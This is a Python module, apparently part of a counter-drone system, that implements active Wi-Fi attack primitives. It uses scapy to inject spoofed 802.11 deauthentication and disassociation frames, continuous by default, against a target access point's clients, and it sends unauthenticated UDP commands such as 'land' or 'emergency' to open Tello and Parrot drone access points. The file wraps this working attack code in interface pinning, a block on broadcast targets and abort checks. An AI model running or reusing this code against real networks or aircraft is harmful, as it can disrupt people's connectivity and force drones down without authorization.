#!/usr/bin/env python3
"""Operator-controlled active Wi-Fi drone-defeat TX primitives (MEGHDUT C3).

TRANSMITS real 802.11 / UDP. Implements the two HONEST active-defeat mechanisms
against a Wi-Fi-controlled drone (see .omc/plans/wifi-defeat-active-cuas-plan.md):

  1. 802.11 deauth / disassoc injection  (send_deauth) — inject management
     frames spoofed as the drone softAP BSSID so the controller<->drone link
     drops and the airframe hits its OWN link-loss failsafe (RTH / hover / land;
     the operator does NOT choose which). This is a LINK-DROP, never a takeover,
     and is a no-op against 802.11w/PMF and un-targetable against a randomized /
     renamed SSID.
  2. Unauthenticated command injection over the drone's OPEN softAP
     (inject_arsdk_command / tello_command) — given a target softAP address and
     a PRE-ENCODED command payload, transmit it over UDP. Applies ONLY to an
     unencrypted Parrot ARSDK3 or Ryze/DJI Tello airframe; it is a targeted
     unauthenticated command against a cooperative unencrypted target, NOT
     takeover of an arbitrary drone. The ENCODING lives in the separate
     wifi_arsdk_encode.py — this module only puts pre-built bytes on the wire.

SCOPE / SAFETY MODEL — mirrors hackrf_jam.py exactly:
This module is a PURE TX primitive. It holds NO authorization logic: the arm
token, effect-specific confirm token, per-target IFF/fratricide ack, commander
role and range-authorization LEASE all live in the governed bridge / backend,
identical to how hackrf_jam.py is driven by jam_bridge.py. What DOES live here
(because it must fail closed at the source, not only in a caller) are the
transmit-refusing SAFETY guards:

  * TX device pinning, fail-closed: WIFI_TX_IFACE must name the dedicated
    injection NIC, or the transmit is REFUSED (the fail-closed analogue of
    hackrf_jam._tx_pinning_error / HACKRF_TX_SERIAL). A dev opt-out
    (WIFI_ALLOW_UNPINNED_TX=1) permits an unpinned transmit for single-NIC
    development, emitting a WARNING — same pattern as HACKRF_ALLOW_UNPINNED_TX.
    When a real pin IS set, the transmit is further BOUND to it: the caller's
    `iface` argument must equal the pinned WIFI_TX_IFACE exactly, or the
    transmit is refused — the Wi-Fi analogue of HackRF's `-d <serial>`
    binding, so a caller cannot pass the detection/RX NIC to a TX call. A
    whitespace-only WIFI_TX_IFACE ("   ") counts as UNSET, not pinned.
  * FRATRICIDE-CRITICAL BSSID scope: send_deauth REFUSES a broadcast
    (FF:FF:FF:FF:FF:FF), empty, None or malformed target_bssid. A deauth MUST
    target one specific softAP BSSID — never blanket-deauth the whole band and
    knock every friendly / registered AP off the air.
  * Prompt abort: every injection loop polls tx_halt_check() (the predicate
    make_tx_halt_check() builds — EMERGENCY ABORT tx_halt OR range-auth lease
    lost) AND stop_event BEFORE every frame / burst / send and stops immediately
    (terminating any subprocess) the instant either fires — mirrors
    hackrf_jam._supervise_transfer / _stop_requested.

NEVER RAISES for a refuse or a TX-side failure: every entry point returns the
module's standard {"ok": bool, "error": Optional[str], ...} shape so the bridge
can send an honest ack instead of crashing. A failing tx_halt / stop probe fails
SAFE (treated as "stop") — a broken predicate must never keep a transmitter keyed.

NO real NIC is required to import or unit-test this module: the actual scapy
frame build/send and the UDP socket send are isolated behind injectable senders
(_tx_deauth_frames / _udp_send, overridable via the *_sender parameters) that lazily
import scapy / open a socket ONLY when actually invoked, so the tests mock them
and no real frame is ever transmitted.
"""
from __future__ import annotations

import os
import re
import socket
import sys
import time
from typing import Any, Callable, Dict, Optional, Tuple


# --- TX DEVICE PINNING (fail-closed) --------------------------------------
# WIFI_TX_IFACE names the dedicated injection / TX NIC (the Wi-Fi analogue of
# hackrf_jam's HACKRF_TX_SERIAL …930c TX unit). The governed bridge's systemd
# EnvironmentFile sets it; the RX/detection NIC stays on Kismet. Defined at
# module level for import compatibility, but the pin gate below reads the value
# LIVE from the environment on every transmit (NOT this cached snapshot) so a
# test / dev can toggle it per-call without re-importing.
WIFI_TX_IFACE = os.environ.get("WIFI_TX_IFACE") or None

# DEV OPT-OUT — WIFI_ALLOW_UNPINNED_TX=1: legitimate single-NIC development (and
# this repo's unit tests, which never own a real injection NIC) may explicitly
# permit an unpinned transmit ONLY by setting this flag. Default (flag absent) =
# fail-closed. Read LIVE from the environment at each transmit (NOT cached at
# import) and consulted ONLY when WIFI_TX_IFACE is unset — the pinned path never
# looks at it. Exact mirror of hackrf_jam's HACKRF_ALLOW_UNPINNED_TX.
WIFI_ALLOW_UNPINNED_TX_ENV = "WIFI_ALLOW_UNPINNED_TX"

# Tello's plaintext-UDP SDK command port (Ryze/DJI Tello). Used when a Tello
# softAP target is given as a bare host with no explicit port.
TELLO_CMD_PORT = 8889
# Parrot ARSDK3 controller->device (c2d) data port DEFAULT. The real port is
# negotiated at discovery (model/firmware-dependent) and is the bridge's concern;
# this is only the fallback when a bare host with no port is supplied. Kept
# explicit and documented rather than guessed silently.
ARSDK_DEFAULT_C2D_PORT = 54321

_BROADCAST_MAC_HEX = "ffffffffffff"
_MAC_RE = re.compile(r"^([0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2}$")


def _pinned_wifi_tx_iface() -> Optional[str]:
    """Live-read WIFI_TX_IFACE, treating a missing OR whitespace-only value as
    UNSET (fail-closed — a blank pin must never be mistaken for a real one).
    Returns the stripped iface name when a real pin is set, else None."""
    return (os.environ.get("WIFI_TX_IFACE") or "").strip() or None


def _wifi_tx_pinning_error(iface: Optional[str] = None) -> Optional[str]:
    """Fail-closed TX-pinning gate, shared by every transmit entry point below.

    Returns None when the transmit is PERMITTED, and a human-readable error
    string when the transmit must be REFUSED. Never transmits, never raises.
    Reads WIFI_TX_IFACE / WIFI_ALLOW_UNPINNED_TX LIVE (not cached module
    globals) so a per-call toggle works. A whitespace-only WIFI_TX_IFACE
    counts as UNSET.

    Two ways to be PERMITTED:
      1. A real pin is set AND `iface` (the caller's target NIC) equals it —
         the governed / production path, now BOUND to the pinned NIC (the
         Wi-Fi analogue of HackRF's `-d <serial>` binding): a caller passing
         e.g. the detection/RX NIC is REFUSED, not silently allowed through
         just because *some* pin exists. `iface=None` (caller did not supply
         one to check) also passes once a pin is set.
      2. No real pin is set AND the explicit WIFI_ALLOW_UNPINNED_TX=1 dev
         opt-out is set — the single-NIC dev escape hatch, which allows ANY
         iface (that is the point of the opt-out) but still emits a one-line
         WARNING to stderr so an unpinned injection can never be mistaken for
         a governed run.

    Otherwise REFUSED: no real pin and no opt-out, or a real pin that does not
    match the caller's iface."""
    pinned = _pinned_wifi_tx_iface()
    if pinned:
        if iface is not None and iface.strip() != pinned:
            return (f"REFUSING TX (fail-closed): iface {iface!r} does not "
                     f"match the pinned WIFI_TX_IFACE {pinned!r}. Transmit is "
                     f"bound to the pinned injection NIC only — pass the "
                     f"pinned iface, or repoint WIFI_TX_IFACE at the NIC you "
                     f"intend to transmit on.")
        return None  # pinned, and iface (if given) matches -> governed path
    if os.environ.get(WIFI_ALLOW_UNPINNED_TX_ENV) == "1":
        print("WARNING: WIFI_TX_IFACE is unset — injecting UNPINNED "
              "(WIFI_ALLOW_UNPINNED_TX=1). Single-NIC DEV ONLY; on a dual-NIC "
              "box an unpinned inject can key the wrong / detection NIC and take "
              "detection RX down.", file=sys.stderr)
        return None
    return ("REFUSING TX (fail-closed): WIFI_TX_IFACE is not set. An unpinned "
            "802.11 / UDP inject could key the RX / detection NIC and knock "
            "Kismet detection off the air. Pin the injection NIC via "
            "WIFI_TX_IFACE (the governed bridge does this through systemd), or "
            "set WIFI_ALLOW_UNPINNED_TX=1 for explicit single-NIC dev use.")


def _stop_requested(stop_event, tx_halt_check) -> bool:
    """Single place every injection loop polls to decide whether the operator
    (or an expired range-auth lease) has demanded a stop. Checks the
    EMERGENCY-ABORT stop_event AND the optional tx_halt_check — either one ends
    TX. Both probes are polled inside the SAME try/except: a failing/raising
    stop_event.is_set() fails SAFE exactly like a failing tx_halt_check (treated
    as "stop"), never as "continue" — a broken predicate, of either kind, must
    never keep an injector transmitting. Mirrors hackrf_jam._stop_requested."""
    try:
        if stop_event is not None and stop_event.is_set():
            return True
        if tx_halt_check is not None and tx_halt_check():
            return True
    except Exception:
        return True
    return False


def _normalize_mac(mac: Optional[str]) -> Optional[str]:
    """Lower-case hex-only form of a MAC (separators stripped), or None if the
    value is missing / not a well-formed 6-octet MAC."""
    if not isinstance(mac, str):
        return None
    s = mac.strip()
    if not _MAC_RE.match(s):
        return None
    return re.sub(r"[:-]", "", s).lower()


def _bssid_scope_error(target_bssid: Optional[str]) -> Optional[str]:
    """FRATRICIDE-CRITICAL BSSID-scope gate for send_deauth. Returns None when
    target_bssid names one specific, well-formed unicast softAP BSSID, and a
    refuse-message when it is empty / None / malformed / the broadcast address.
    A deauth MUST target a single BSSID — never the whole band."""
    if target_bssid is None or (isinstance(target_bssid, str) and not target_bssid.strip()):
        return ("REFUSING DEAUTH (fratricide guard): a specific target BSSID is "
                "mandatory; empty / None BSSID would blanket-deauth the band.")
    hexmac = _normalize_mac(target_bssid)
    if hexmac is None:
        return (f"REFUSING DEAUTH (fratricide guard): target_bssid "
                f"{target_bssid!r} is not a well-formed MAC address.")
    if hexmac == _BROADCAST_MAC_HEX:
        return ("REFUSING DEAUTH (fratricide guard): broadcast BSSID "
                "FF:FF:FF:FF:FF:FF would deauth every AP on the channel — a "
                "deauth must target one specific drone softAP BSSID.")
    return None


# --- isolated, injectable, radio-touching senders -------------------------
# These are the ONLY functions that touch a real NIC / socket. They lazily
# import scapy / open a socket ONLY when actually called, so importing this
# module (and the unit tests, which inject fakes) never needs a radio.

def _tx_deauth_frames(iface: str, target_bssid: str, client_mac: str,
                      channel: Optional[int]) -> None:
    """Build and inject ONE deauth+disassoc burst spoofed as target_bssid on
    `iface`. This is the single well-isolated real-TX call for the 802.11 path;
    the injection loop in send_deauth polls the abort predicate BEFORE every
    call to this function. scapy is imported lazily so the module imports without
    it; a real deployment could alternatively drive an aireplay-ng subprocess
    here (in which case the loop's abort must terminate that process)."""
    from scapy.all import RadioTap, Dot11, Dot11Deauth, Dot11Disas, sendp  # lazy

    # Spoof the softAP BSSID as both the transmitter (addr2) and the BSS (addr3);
    # deauth the specific client (addr1) — client_mac broadcast (FF:FF:FF:FF:FF:FF)
    # here targets all clients OF THIS ONE BSSID only (that is the drone's own
    # controller), which is NOT the band-wide broadcast the BSSID guard forbids.
    dot11 = Dot11(addr1=client_mac, addr2=target_bssid, addr3=target_bssid)
    deauth = RadioTap() / dot11 / Dot11Deauth(reason=7)
    disas = RadioTap() / dot11 / Dot11Disas(reason=7)
    sendp([deauth, disas], iface=iface, verbose=False)


def _udp_send(target: Tuple[str, int], payload: bytes) -> None:
    """Send one UDP datagram of pre-built bytes to (host, port). The single
    well-isolated real-TX call for the ARSDK / Tello command paths; the send is
    gated by an abort poll before it is invoked. Opens a socket only when
    called."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.sendto(payload, target)
    finally:
        sock.close()


def _resolve_softap(softap: Any, default_port: int) -> Tuple[Optional[Tuple[str, int]], Optional[str]]:
    """Normalize a softAP target into (host, port). Accepts "host", "host:port",
    or a (host, port) tuple/list. Returns (target, None) on success or
    (None, error) — fail-closed — when host is empty or the port is invalid."""
    host: Optional[str] = None
    port: Optional[int] = None
    if isinstance(softap, (tuple, list)):
        if len(softap) == 2:
            host, port = softap[0], softap[1]
    elif isinstance(softap, str):
        s = softap.strip()
        if ":" in s:
            h, _, p = s.rpartition(":")
            host = h
            try:
                port = int(p)
            except (TypeError, ValueError):
                return None, f"invalid port in softAP address {softap!r}"
        else:
            host, port = s, default_port
    if not isinstance(host, str) or not host.strip():
        return None, f"REFUSING TX: empty / missing softAP host in {softap!r}"
    try:
        port = int(port)
    except (TypeError, ValueError):
        return None, f"REFUSING TX: invalid softAP port in {softap!r}"
    if not (0 < port < 65536):
        return None, f"REFUSING TX: softAP port {port} out of range"
    return (host.strip(), port), None


# --- public TX primitives -------------------------------------------------

def send_deauth(
    iface: str,
    target_bssid: str,
    client_mac: Optional[str],
    channel: Optional[int],
    count: Optional[int],
    stop_event: Optional["Any"] = None,
    tx_halt_check: Optional[Callable[[], bool]] = None,
    frame_sender: Optional[Callable[[str, str, str, Optional[int]], None]] = None,
) -> Dict[str, Any]:
    """Inject 802.11 deauth/disassoc management frames spoofed as target_bssid so
    the drone's controller link drops (LINK-DROP failsafe, NOT takeover).

    FAIL-CLOSED SAFETY GUARDS, in order, all REFUSE by returning ok=False with no
    frame sent (never raise):
      1. TX-pin: _wifi_tx_pinning_error(iface) — refuse an unpinned inject, AND
         (when a real pin IS set) refuse an `iface` that does not equal the
         pinned WIFI_TX_IFACE — no transmitting on the wrong NIC.
      2. FRATRICIDE: _bssid_scope_error() — refuse broadcast / empty / None /
         malformed target_bssid; a specific unicast softAP BSSID is mandatory.

    count: number of deauth bursts to inject. None / <= 0 means CONTINUOUS —
    inject until the operator stops it (stop_event / tx_halt_check). Either way
    the loop polls _stop_requested(stop_event, tx_halt_check) BEFORE every burst
    and stops immediately when it fires (prompt abort), so a global EMERGENCY
    ABORT or an expired range-auth lease ends the effect within one iteration.

    client_mac: the client to deauth off this BSSID; defaults to this BSSID's
    broadcast client (FF:FF:FF:FF:FF:FF) — that is band-safe because addr2/addr3
    still pin the ONE softAP BSSID (it deauths only that softAP's own clients),
    which is why it is NOT rejected by the fratricide guard (that guard is about
    the target BSSID, addr2/addr3).

    frame_sender: injectable one-burst TX hook for tests (default = the real
    scapy _tx_deauth_frames). Receives (iface, target_bssid, client_mac, channel)
    so a test can assert the correct BSSID / channel were transmitted, without a
    real NIC.

    Returns {"ok", "error", "stopped_early", "frames_sent"}."""
    pin_err = _wifi_tx_pinning_error(iface)
    if pin_err:
        return {"ok": False, "error": pin_err, "stopped_early": False, "frames_sent": 0}
    scope_err = _bssid_scope_error(target_bssid)
    if scope_err:
        return {"ok": False, "error": scope_err, "stopped_early": False, "frames_sent": 0}

    client = client_mac if (isinstance(client_mac, str) and client_mac.strip()) else "FF:FF:FF:FF:FF:FF"
    sender = frame_sender or _tx_deauth_frames
    continuous = count is None or count <= 0
    remaining = None if continuous else int(count)

    frames_sent = 0
    while True:
        # Poll BEFORE every burst: a truthy tx_halt / stop_event ends TX with no
        # further frame injected (prompt abort — mirrors _supervise_transfer).
        if _stop_requested(stop_event, tx_halt_check):
            return {"ok": True, "error": None, "stopped_early": True, "frames_sent": frames_sent}
        if remaining is not None and remaining <= 0:
            break
        try:
            sender(iface, target_bssid, client, channel)
        except Exception as e:  # never crash the bridge on a TX-side failure
            return {"ok": False, "error": f"deauth inject failed: {e}",
                    "stopped_early": False, "frames_sent": frames_sent}
        frames_sent += 1
        if remaining is not None:
            remaining -= 1

    return {"ok": True, "error": None, "stopped_early": False, "frames_sent": frames_sent}


def inject_arsdk_command(
    iface: str,
    softap: Any,
    command_bytes: bytes,
    stop_event: Optional["Any"] = None,
    tx_halt_check: Optional[Callable[[], bool]] = None,
    udp_sender: Optional[Callable[[Tuple[str, int], bytes], None]] = None,
) -> Dict[str, Any]:
    """Transmit a PRE-ENCODED Parrot ARSDK3 command (e.g. land / emergency) to
    the drone's OPEN softAP over UDP. Association to the softAP as a Wi-Fi client
    and the frame ENCODING are NOT this primitive's job (bridge / OS and
    wifi_arsdk_encode.py respectively) — given a target address and ready bytes,
    it just puts them on the wire, unencrypted-Parrot-only.

    Fail-closed: refuses (ok=False, no send, no raise) on an unpinned TX, an
    unresolvable softAP target, or when the abort predicate is already truthy at
    send time (prompt abort — nothing is transmitted after a stop).

    udp_sender: injectable send hook for tests (default = the real socket
    _udp_send). Returns {"ok", "error", "stopped_early", "bytes_sent"}."""
    return _udp_command(iface, softap, command_bytes, ARSDK_DEFAULT_C2D_PORT,
                        stop_event, tx_halt_check, udp_sender, "ARSDK")


def tello_command(
    iface: str,
    softap: Any,
    command: Any,
    stop_event: Optional["Any"] = None,
    tx_halt_check: Optional[Callable[[], bool]] = None,
    udp_sender: Optional[Callable[[Tuple[str, int], bytes], None]] = None,
) -> Dict[str, Any]:
    """Transmit a Ryze/DJI Tello plaintext-UDP SDK command (e.g. "land",
    "emergency") to the drone's OPEN softAP. Tello's wire format IS the ASCII
    command string, so a str command is encoded to bytes at the wire here; a
    bytes command is sent verbatim. Same fail-closed pin gate + abort poll +
    no-raise contract as inject_arsdk_command. Tello ≠ ARSDK3 — separate
    plaintext SDK, hence a separate primitive.

    Returns {"ok", "error", "stopped_early", "bytes_sent"}."""
    if isinstance(command, bytes):
        payload = command
    elif isinstance(command, str):
        payload = command.strip().encode("ascii", errors="ignore")
    else:
        return {"ok": False, "error": f"tello command must be str or bytes, got {type(command).__name__}",
                "stopped_early": False, "bytes_sent": 0}
    if not payload:
        return {"ok": False, "error": "REFUSING TX: empty tello command payload",
                "stopped_early": False, "bytes_sent": 0}
    return _udp_command(iface, softap, payload, TELLO_CMD_PORT,
                        stop_event, tx_halt_check, udp_sender, "Tello")


def _udp_command(iface, softap, payload, default_port, stop_event, tx_halt_check,
                 udp_sender, label) -> Dict[str, Any]:
    """Shared fail-closed UDP-send body for inject_arsdk_command / tello_command:
    TX-pin gate (bound to `iface`) -> softAP resolution -> pre-send abort poll
    -> single UDP send. Never raises."""
    pin_err = _wifi_tx_pinning_error(iface)
    if pin_err:
        return {"ok": False, "error": pin_err, "stopped_early": False, "bytes_sent": 0}
    if not isinstance(payload, (bytes, bytearray)):
        return {"ok": False, "error": f"{label} command_bytes must be pre-encoded bytes",
                "stopped_early": False, "bytes_sent": 0}
    if not payload:
        return {"ok": False, "error": f"REFUSING TX: empty {label} command payload",
                "stopped_early": False, "bytes_sent": 0}
    target, target_err = _resolve_softap(softap, default_port)
    if target_err:
        return {"ok": False, "error": target_err, "stopped_early": False, "bytes_sent": 0}

    # Prompt abort: poll BEFORE the send — a truthy tx_halt / stop_event means
    # nothing is transmitted (mirrors the deauth loop's pre-burst poll).
    if _stop_requested(stop_event, tx_halt_check):
        return {"ok": True, "error": None, "stopped_early": True, "bytes_sent": 0}

    sender = udp_sender or _udp_send
    try:
        sender(target, bytes(payload))
    except Exception as e:
        return {"ok": False, "error": f"{label} UDP send failed: {e}",
                "stopped_early": False, "bytes_sent": 0}
    return {"ok": True, "error": None, "stopped_early": False, "bytes_sent": len(payload)}
